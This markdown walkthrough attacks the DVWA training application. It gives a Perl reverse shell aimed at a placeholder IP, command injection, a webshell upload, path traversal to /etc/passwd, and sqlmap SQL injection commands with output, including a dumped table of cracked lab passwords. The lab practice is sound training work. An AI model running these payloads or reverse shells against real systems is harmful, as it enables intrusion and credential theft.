## Brute Force
#### Credential
admin:password

## Command Injection
#### Command
- `127.0.0.1;whoami`
#### RevShell
- `127.0.0.1;perl -e 'use Socket;$i="{IP}";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'`
  - Reverse Shell Generator:perl

## File Inclusion
- `http://{IP}/vulnerabilities/fi/?page=../../../../../../etc/passwd`

## File Upload
- upload:`webshell.php`
- File Include:`../../hackable/uploads/shell.php`
- Revshell
  - `perl -e 'use Socket;$i="{IP}";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'`

## SQL Injection
#### manual
- `offsec' OR 1=1 -- //`
#### SQLmap
- Get Cookie
<img width="815" height="416" alt="image" src="https://github.com/user-attachments/assets/cd357c7b-fb61-422f-8594-a847fa571817" />
- Normal enum
  - `sqlmap -u "http://192.168.31.157:3000/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=ld5d1ti95ptkpk016eva9vnu77; security=low"`
```
sqlmap identified the following injection point(s) with a total of 3988 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 6068=6068 AND 'dyBl'='dyBl&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 5754 FROM (SELECT(SLEEP(5)))XLst) AND 'qtwB'='qtwB&Submit=Submit
---
```
- Get Databases Name
  - `sqlmap -u "http://192.168.31.157:3000/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=ld5d1ti95ptkpk016eva9vnu77; security=low" --dbs`
```
available databases [2]:
[*] dvwa
[*] information_schema
```
- Get Tables
  - `sqlmap -u "http://192.168.31.157:3000/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=ld5d1ti95ptkpk016eva9vnu77; security=low" -D dvwa --tables`
```
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
```
- Get Credential
  - `sqlmap -u "http://192.168.31.157:3000/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=ld5d1ti95ptkpk016eva9vnu77; security=low"  -D dvwa -T users -C user,password --dump`
```
[5 entries]
+---------+---------------------------------------------+
| user    | password                                    |
+---------+---------------------------------------------+
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------------------------------------------+
```
